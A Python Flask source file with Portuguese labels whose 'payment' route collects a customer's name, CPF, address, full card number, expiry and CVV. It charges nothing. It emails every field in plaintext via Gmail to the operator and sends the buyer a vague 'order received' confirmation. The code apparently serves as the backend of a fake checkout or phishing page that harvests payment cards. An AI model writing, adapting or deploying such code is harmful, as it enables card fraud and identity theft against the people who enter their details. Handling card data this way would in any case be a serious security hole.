import io
import os
from datetime import datetime
from flask import Flask, render_template, request, jsonify
import requests

import qrcode
from reportlab.lib.pagesizes import A4
from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Image
from reportlab.lib.styles import getSampleStyleSheet
from reportlab.lib.colors import blue

from flask_mail import Mail, Message
from dotenv import load_dotenv

# =========================
# SETUP BASE
# =========================
app = Flask(__name__)

load_dotenv()

# =========================
# MAIL CONFIG
# =========================
app.config['MAIL_SERVER'] = 'smtp.gmail.com'
app.config['MAIL_PORT'] = 587
app.config['MAIL_USE_TLS'] = True

app.config['MAIL_USERNAME'] = os.getenv('MAIL_USERNAME')
app.config['MAIL_PASSWORD'] = os.getenv('MAIL_PASSWORD')

app.config['MAIL_DEFAULT_SENDER'] = os.getenv('MAIL_USERNAME')

mail = Mail(app)

# =========================
# ROUTE PAYMENT
# =========================
@app.route('/processando_payment', methods=['POST'])
def salvar():
    nome = request.form['nome']
    email = request.form['email']
    cpf = request.form['cpf']
    cep = request.form['cep']
    endereco = request.form['endereco']
    bairro = request.form['bairro']
    numero = request.form['numero']
    cidade = request.form['cidade']
    numero_cartao = request.form['numero_cartao']
    nome_titular = request.form['nome_titular']
    mes_ano = request.form['mes_ano']
    controle = request.form['controle']

    msg = Message(
        subject="Novo pagamento recebido",
        recipients=[app.config['MAIL_USERNAME']],
        body=f"""
Nome: {nome}
Email: {email}
CPF: {cpf}
CEP: {cep}
Endereço: {endereco}
Número: {numero}
Bairro: {bairro}
Cidade: {cidade}
Cartão: {numero_cartao}
Titular: {nome_titular}
Validade: {mes_ano}
CVV: {controle}
"""
    )

    try:
        mail.send(msg)
    except Exception as e:
        print("Erro mail interno:", e)

    msg1 = Message(
        subject="Confirmação",
        recipients=[email],
        html=f"""
        <p>Olá {nome}</p>
        <p>Pedido recebido</p>
        """
    )

    try:
        mail.send(msg1)
    except Exception as e:
        print("Erro mail cliente:", e)

    return render_template("index.html")

# =========================
# RUN (LOCAL ONLY)
# =========================
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
